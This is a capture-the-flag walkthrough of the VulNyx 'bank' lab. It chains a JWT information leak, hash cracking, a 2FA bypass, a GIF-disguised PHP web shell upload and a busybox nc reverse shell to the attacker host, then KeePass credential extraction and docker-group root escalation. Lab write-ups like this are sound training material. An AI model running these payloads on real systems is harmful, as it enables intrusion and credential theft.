# bank

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| bank | Alherrero | Easy | VulNyx |

**Summary:** The bank machine exposes Apache httpd 2.4.66 and Samba 4.22.8 on Debian. Unauthenticated SMB enumeration against the `development` share reveals a development memo disclosing a hidden application directory path, `development-0119-d5e051a-9da2-12sdas1-775-e0174`. The web application utilizes JSON Web Tokens (JWT) for authentication and recipient metadata handling. By querying the `verify_recipient` parameter on the dashboard transfer endpoint for user `admin`, the application leaks a JWT token in the `X-Recipient-Metadata` response header containing the administrator's bcrypt password hash. Cracking the hash yields the plaintext password `blink182`. Upon logging in as administrator, a two-factor authentication (OTP) verification page is presented; however, the issued `auth_token` JWT embeds the generated 6-digit OTP in plaintext within its client-side claims, allowing direct 2FA bypass. Authenticated administrative privileges expose an avatar upload feature that fails to adequately validate file contents, permitting a PHP web shell disguised with GIF magic bytes to execute arbitrary commands as `www-data`.

Internal reconnaissance discovers an unprotected internal Samba directory at `/srv/smb/passwords` containing a KeePass database (`passwords.kdbx`) alongside a note detailing its master password. Extracting credentials from the database yields the password for local user `marcelo`. Because `marcelo` belongs to the `docker` group, mounting the host filesystem root inside a Debian container allows resetting the root user's password and achieving complete superuser compromise.

---

## Reconnaissance

The engagement commenced on the VirtualBox host-only subnet `192.168.56.0/24`, with the attacker machine operating from `192.168.56.1`.

1. An initial ARP ping sweep located active hosts on the subnet, identifying the target machine at `192.168.56.204`:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 09:50 +0700
Nmap scan report for 192.168.56.100
Host is up (0.000085s latency).
MAC Address: 08:00:27:D8:98:E1 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.204
Host is up (0.00049s latency).
MAC Address: 08:00:27:B9:F3:71 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.48 seconds
```

2. The target IP was saved into a shell variable and subjected to a full TCP port scan:

```zsh
❯ ip=192.168.56.204
```

```zsh
❯ nmap -p- $ip                              
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 09:51 +0700
Nmap scan report for 192.168.56.204
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds
```

3. Service detection and default NSE scripts were executed against the three exposed ports:

```zsh
❯ nmap -p 80,139,445 -sCV -Pn -T4 --min-rate 5000 $ip                                                   
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 09:52 +0700
Nmap scan report for 192.168.56.204
Host is up (0.00094s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://bank.nyx/
|_http-server-header: Apache/2.4.66 (Debian)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: Host: bank.nyx

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: BANK, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-09-20T02:52:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.31 seconds
```

The scan revealed Apache httpd 2.4.66 redirecting to `http://bank.nyx/`, alongside Samba services on ports 139 and 445.

4. The target domain `bank.nyx` was mapped to `192.168.56.204` in `/etc/hosts`:

```zsh
❯ echo '192.168.56.204 bank.nyx' | sudo tee -a /etc/hosts   
192.168.56.204 bank.nyx
```

5. An unauthenticated null-session SMB share enumeration was run against port 445 using NetExec (`nxc`):

```zsh
❯ nxc smb $ip -u '' -p '' --shares
SMB         192.168.56.204  445    BANK             [*] Unix - Samba (name:BANK) (domain:bank.nyx) (signing:False) (SMBv1:False) (Null Auth:True)
SMB         192.168.56.204  445    BANK             [+] bank.nyx\: 
SMB         192.168.56.204  445    BANK             [*] Enumerated shares
SMB         192.168.56.204  445    BANK             Share           Permissions            Remark
SMB         192.168.56.204  445    BANK             -----           -----------            ------
SMB         192.168.56.204  445    BANK             development     READ,WRITE (ACL)       
SMB         192.168.56.204  445    BANK             print$                                 Printer Drivers
SMB         192.168.56.204  445    BANK             IPC$                                   IPC Service (Samba 4.22.8-Debian-4.22.8+dfsg-0+deb13u1)
SMB         192.168.56.204  445    BANK             nobody                                 Home Directories
```

The `development` share permitted anonymous read and write access.

6. Connecting to the `development` share via `smbclient` without credentials revealed a text file named `03-may-26.txt`:

```zsh
❯ smbclient //$ip/development -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May  3 17:43:20 2026
  ..                                  D        0  Sun May  3 17:43:20 2026
  03-may-26.txt                       N     1141  Sun May  3 17:43:20 2026

		9627844 blocks of size 1024. 6282396 blocks available
smb: \> get 03-may-26.txt 
getting file \03-may-26.txt of size 1141 as 03-may-26.txt (79.6 KiloBytes/sec) (average 79.6 KiloBytes/sec)
smb: \> quit
```

7. Inspecting the contents of `03-may-26.txt` disclosed critical operational details regarding the banking platform:

```zsh
❯ cat 03-may-26.txt 
Subject: AI Agent Integration & Development Environment Setup

To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow. 
The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs. 
For this reason, it is important to maintain strict attention to security and validate all critical operations.

A dedicated development directory has been enabled where developers can access and test the application.
Dir: development-0119-d5e051a-9da2-12sdas1-775-e0174

Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company. 
He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are 
still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed 
to ensure everything is properly configured.

Best regards,
Marcelo
```

The note provided:
- A hidden web directory: `development-0119-d5e051a-9da2-12sdas1-775-e0174`
- Names of relevant users: `Marcelo`, `Juan`, and `Lucas`
- An indication that an AI agent had assisted in writing application code, potentially introducing security flaws.

---

## Initial Access

### Web Application Discovery & Recipient Metadata Information Disclosure

8. Checking the HTTP status of the development path confirmed an active PHP application:

```zsh
❯ curl -I $url/development-0119-d5e051a-9da2-12sdas1-775-e0174/
HTTP/1.1 200 OK
Date: Sun, 20 Sep 2026 02:59:27 GMT
Server: Apache/2.4.66 (Debian)
Set-Cookie: PHPSESSID=f844578cb47a30def2f4e5b7f08ec439; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

9. Navigating to the banking application in the browser, a standard user account (`test:1234567890`) was registered and logged in. Inspecting the profile view at `?page=profile` revealed account information and developer cookies:

![](images/img-6.png)

The profile displayed Customer ID `#10`, Username `test`, and Account Type `Standard`. The browser storage tools revealed an `auth_token` cookie containing a JSON Web Token (JWT).

10. Decoding the `auth_token` JWT using a token debugger uncovered the token structure and claim keys:

![](images/img.png)

The decoded payload showed standard session claims:
- `user_id`: `10`
- `username`: `"test"`
- `is_admin`: `0`
- `otp_verified`: `true`

11. The authentication flow and dashboard features were analyzed via `curl`. Submitting login credentials established an authenticated session and stored the `auth_token` cookie:

```zsh
❯ curl -s -c cookies.txt -X POST "$url/development-0119-d5e051a-9da2-12sdas1-775-e0174/" \
  -d "username=test&password=1234567890&login=1" -i
HTTP/1.1 302 Found
Date: Sun, 20 Sep 2026 03:44:32 GMT
Server: Apache/2.4.66 (Debian)
Set-Cookie: PHPSESSID=d8547907c762c4b32e1627be8f5016b4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMCwidXNlcm5hbWUiOiJ0ZXN0IiwiaXNfYWRtaW4iOjAsImV4cCI6MTc4OTg3OTQ3Mywib3RwX3ZlcmlmaWVkIjp0cnVlfQ.D_nLKmuchUx1arkNiMeZo6tl4Qli8YrussKbnDQt2MY; expires=Sun, 20 Sep 2026 04:44:33 GMT; Max-Age=3600; path=/; HttpOnly
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

12. The dashboard exposed a money transfer mechanism. Submitting a test transfer to `admin` completed normally:

```zsh
❯ curl -s -b cookies.txt -c cookies.txt -X POST "$url/development-0119-d5e051a-9da2-12sdas1-775-e0174/?page=dashboard" \
  -d "to_username=admin&amount=1&description=test&transfer_money=1" -i
HTTP/1.1 302 Found
Date: Sun, 20 Sep 2026 03:45:10 GMT
Server: Apache/2.4.66 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php?msg=Sent
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

13. The application also supported a recipient verification feature via `verify_recipient=1`. Invoking this check against `admin` returned an unexpected HTTP response header, `X-Recipient-Metadata`:

```zsh
❯ curl -s -b cookies.txt -X POST "$url/development-0119-d5e051a-9da2-12sdas1-775-e0174/?page=dashboard" \
  -d "to_username=admin&verify_recipient=1" -i
HTTP/1.1 200 OK
Date: Sun, 20 Sep 2026 03:45:50 GMT
Server: Apache/2.4.66 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Recipient-Metadata: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiJDJ5JDEyJFg0dXBwUXZ6d0ZDU2JWZkNIN3FGMWVOT1NBNlwvY0J5XC9vNXNiVmN4eGRmdVwvR0Y3LmEwWUtpIiwiYmFsYW5jZSI6IjEwMDAxMDEuOTkiLCJpc19hZG1pbiI6MSwidXNlX290cCI6MSwiY3JlYXRlZF9hdCI6IjIwMjYtMDUtMDIgMTM6MjQ6MTMifQ.zRB4sy2jTMVl1QQoL99Q5X-4JrZEi8yCuZGaSYnD6VQ
Vary: Accept-Encoding
Content-Length: 6437
Content-Type: text/html; charset=UTF-8
...
```

14. Decoding the JWT received in `X-Recipient-Metadata` revealed that the application serialized the entire recipient database row into the token:

![](images/img-2.png)

The decoded payload contained:
- `id`: `1`
- `username`: `"admin"`
- `password`: `"$2y$12$X4uppQvzwFCSbVfCH7qF1eN0SA6/cbY/o5sbVcxxfu/GF7.a0YKi"`
- `balance`: `"1000101.99"`
- `is_admin`: `1`
- `use_otp`: `1`
- `created_at`: `"2026-05-02 13:24:13"`

The recipient verification endpoint critically leaked the administrator's bcrypt password hash.

### Cracking Administrator Credentials & 2FA OTP JWT Leakage

15. The bcrypt hash was extracted and saved to a local file:

```zsh
❯ echo '$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi' > hash
```

16. Hashcat cracked the bcrypt hash (`-m 3200`) against `rockyou.txt` in seconds, recovering the plaintext password `blink182`:

```zsh
❯ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -O       
hashcat (v7.1.2) starting
...
$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi:blink182
  
Session..........: hashcat
Status...........: Cracked
...
```

17. Authenticating as `admin:blink182` triggered the secondary authentication check, presenting a "Security Verification (OTP)" screen:

![](images/img-3.png)

18. Inspecting the browser's Network panel revealed that the server responded with a newly generated `auth_token` cookie for the pending admin session. Decoding this JWT exposed another severe flaw:

![](images/img-4.png)

The decoded payload contained:
```json
{
  "user_id": 1,
  "username": "admin",
  "is_admin": 1,
  "exp": 1789880448,
  "otp": 700855,
  "attempts": 3,
  "otp_verified": false
}
```

The backend generated the 6-digit one-time password (`700855`) and directly embedded it into the client-side JWT claims. Entering `700855` into the verification form validated the session and updated the claim to `"otp_verified": true`.

### Bypassing Avatar Upload Validation to Achieve RCE

19. Navigating to the administrator profile view at `?page=profile` revealed an administrative photo upload feature labeled "UPDATE PHOTO (ADMIN)":

![](images/img-5.png)

Attempting to upload standard files triggered client/server-side validation:
`Error: Invalid file type. Only JPG, PNG and GIF are allowed.`

20. To bypass file type checks while ensuring the PHP code executes, a payload file `shell.php` was crafted with the GIF89a magic bytes header:

```zsh
❯ echo 'GIF89a;\n<?php system($_GET["c"]); ?>' shell.php
```

21. Using the verified administrator `auth_token`, the payload was uploaded as multipart form data with the `image/gif` MIME type:

```zsh
❯ curl -s -b "auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cCI6MTc4OTg4MDQ0OCwib3RwIjo3MDA4NTUsImF0dGVtcHRzIjozLCJvdHBfdmVyaWZpZWQiOnRydWV9.A5huk2ot8jmYJbHOMvS6LM7ofGTmVEh0pKQm5hBUdZw" \
  -X POST "$url/development-0119-d5e051a-9da2-12sdas1-775-e0174/?page=profile" \
  -F "avatar=@shell.php;type=image/gif" -F "upload_avatar=1" -i
HTTP/1.0 500 Internal Server Error
Date: Sun, 20 Sep 2026 04:12:50 GMT
Server: Apache/2.4.66 (Debian)
Set-Cookie: PHPSESSID=66bcf5dd88ab7725276c90fc727b751e; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

22. Although the server returned an HTTP 500 status code during post-upload processing, the file was successfully written to the `uploads/` directory. Direct access confirmed arbitrary command execution as `www-data`:

```zsh
❯ curl -s "http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/shell.php?c=id" 
GIF89a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Establishing Interactive Reverse Shell

23. A listener was initialized locally on port 6666 using Penelope:

```zsh
❯ penelope -p 6666
...
```

24. A Netcat reverse shell payload was dispatched through the `c` query parameter:

```zsh
❯ curl -s "http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/shell.php?c=busybox%20nc%20192.168.56.1%206666%20-e%20/bin/bash"
```

The listener caught the reverse connection, granting an interactive shell as `www-data`.

---

## Lateral Movement

### Local System Enumeration & Leaked KeePass Database

25. Initial system enumeration identified local user accounts with interactive shells in `/etc/passwd`:

```zsh
...
www-data@bank:/var/www/bank/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
marcelo:x:1000:1000:marcelo,,,:/home/marcelo:/bin/bash
juan:x:1001:1001:,,,:/home/juan:/bin/bash
lucas:x:1002:1002:,,,:/home/lucas:/bin/bash
```

26. Investigating the Samba directories under `/srv/smb` revealed an unshared directory, `/srv/smb/passwords`:

```zsh
www-data@bank:/srv/smb/passwords$ ls -la
total 16
drwxrwxrwx 2 root root 4096 May  3 06:53 .
drwxrwxr-x 4 root root 4096 May  3 06:43 ..
-rw-rw-r-- 1 juan juan  383 May  3 06:53 note.txt
-rw-rw-r-- 1 juan juan 2277 May  3 06:51 passwords.kdbx
```

27. Reading `note.txt` revealed a message from Juan to Marcelo containing the master password for the KeePass database:

```zsh
www-data@bank:/srv/smb/passwords$ cat note.txt 
Hey, as you said Marcelo, I’ve already left a KeePass file with all the system passwords you asked me to create, except for the root password. 
The KeePass password is: `@zm{2h8aUu'a_M;'Jd:!MAQ?zn

Delete it after reading, but don’t worry—I think I’ve configured this directory properly so only you can access 
it, and it’s not exposed on the SMB service either.

— Juan
```

Juan had improperly set directory permissions, leaving the folder and files readable by all local users.

28. A temporary Python HTTP server was started on port 9999 to transfer the KeePass database:

```zsh
www-data@bank:/srv/smb/passwords$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
```

29. The database was retrieved on the attacker host:

```zsh
❯ wget http://192.168.56.204:9999/passwords.kdbx 
```

```zsh
--2026-09-20 11:29:47--  http://192.168.56.204:9999/passwords.kdbx
Connecting to 192.168.56.204:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2277 (2.2K) [application/octet-stream]
Saving to: ‘passwords.kdbx’

passwords.kdbx             100%[======================================>]   2.22K  --.-KB/s    in 0s      

2026-09-20 11:29:47 (4.68 MB/s) - ‘passwords.kdbx’ saved [2277/2277]
```

```zsh
192.168.56.1 - - [20/Sep/2026 00:29:45] "GET /passwords.kdbx HTTP/1.1" 200 -
```

### Extracting User Credentials & Pivoting to Marcelo

30. Using `keepassxc-cli` and the master password ``@zm{2h8aUu'a_M;'Jd:!MAQ?zn``, the entries within `passwords.kdbx` were listed:

```zsh
❯ keepassxc-cli ls passwords.kdbx
Enter password to unlock passwords.kdbx: 
marcelo
lucas
juan
```

31. Extracting the credentials for each entry yielded passwords for `marcelo`, `lucas`, and `juan`:

```zsh
❯ keepassxc-cli show -s passwords.kdbx marcelo
Enter password to unlock passwords.kdbx: 
Title: marcelo
UserName: marcelo
Password: m4rC1!#asl2#vsHj4!
URL: 
Notes: 
Uuid: {99f8b439-ecb0-494e-bc6a-f294748a9c6c}
Tags: 
```

```zsh
❯ keepassxc-cli show -s passwords.kdbx lucas  
Enter password to unlock passwords.kdbx: 
Title: lucas
UserName: lucas
Password: lUc4s!62edfgl0o6
URL: 
Notes: 
Uuid: {3a79593d-689a-4a3c-947f-5c55f465837d}
Tags: 
```

```zsh
❯ keepassxc-cli show -s passwords.kdbx juan 
Enter password to unlock passwords.kdbx: 
Title: juan
UserName: juan
Password: j2uan#21eIlLo!76
URL: 
Notes: 
Uuid: {648ae4c1-2bc0-40cd-b056-ce454ecad6d3}
Tags: 
```

32. With the password `m4rC1!#asl2#vsHj4!`, a switch to user `marcelo` succeeded:

```zsh
lucas@bank:~$ su - marcelo
Password: 
marcelo@bank:~$ id
uid=1000(marcelo) gid=1000(marcelo) groups=1000(marcelo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),105(docker)
marcelo@bank:~$ ls
user.txt
```

User `marcelo` owned `user.txt` and held membership in group `docker` (gid 105).

---

## Privilege Escalation

### Docker Group Abuse for Host Root Compromise

33. Checking available Docker images on the host listed a local Debian image:

```zsh
marcelo@bank:~$ docker images
REPOSITORY   TAG             IMAGE ID       CREATED        SIZE
debian       bookworm-slim   865980b94764   5 months ago   74.8MB
```

34. Membership in the `docker` group permits root-equivalent actions. A container was spawned with the host root filesystem mounted at `/mnt`, followed by a chroot into the mounted filesystem:

```zsh
marcelo@bank:~$ docker run -v /:/mnt --rm -it debian:bookworm-slim chroot /mnt /bin/bash
root@260bf5daf67b:/# passwd root
New password: 
Retype new password: 
passwd: password updated successfully
root@260bf5daf67b:/# exit
exit
```

By chrooting into `/mnt`, running `passwd root` updated the root password directly on the underlying host operating system.

35. The session exited back to the host shell and authenticated directly as `root` via `su -`:

```zsh
marcelo@bank:~$ su - root
Password: 
root@bank:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
bank
root@bank:~# cat /root/root.txt /home/marcelo/user.txt 
e8b...
527...
```

Superuser privileges were verified with `id` and both `root.txt` and `user.txt` flags were successfully read.

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP sweep located the target at `192.168.56.204`. Full TCP scanning identified open services on ports 80 (Apache) and 139/445 (Samba). Unauthenticated SMB enumeration against the `development` share leaked `03-may-26.txt`, which disclosed the hidden web directory `development-0119-d5e051a-9da2-12sdas1-775-e0174` and internal user details.
2. **Vulnerability Discovery**: The banking application dashboard provided a `verify_recipient` parameter that returned the `X-Recipient-Metadata` HTTP response header containing an encoded JWT with the complete `admin` user record, exposing the administrator's bcrypt password hash.
3. **Initial Access**: Cracking the bcrypt hash with Hashcat produced the password `blink182`. Submitting admin credentials triggered a 2FA OTP verification prompt where the backend mistakenly embedded the plaintext OTP (`700855`) inside the client-side `auth_token` JWT claims. Bypassing 2FA unlocked the administrator avatar upload feature, which was exploited using a GIF-header-prefixed PHP file (`shell.php`) to achieve remote code execution and a reverse shell as `www-data`.
4. **Lateral Movement**: Internal enumeration revealed a world-readable directory `/srv/smb/passwords` hosting `passwords.kdbx` and `note.txt`. The note leaked the database master password, enabling `keepassxc-cli` to extract passwords for `marcelo`, `lucas`, and `juan`. Authenticating as `marcelo` confirmed membership in the `docker` group.
5. **Privilege Escalation**: Utilizing Docker privileges, a container running `debian:bookworm-slim` mounted the host root directory (`/`) at `/mnt`. Chrooting into `/mnt` enabled changing the host's root password via `passwd root`, granting immediate superuser shell access and retrieval of both flags.
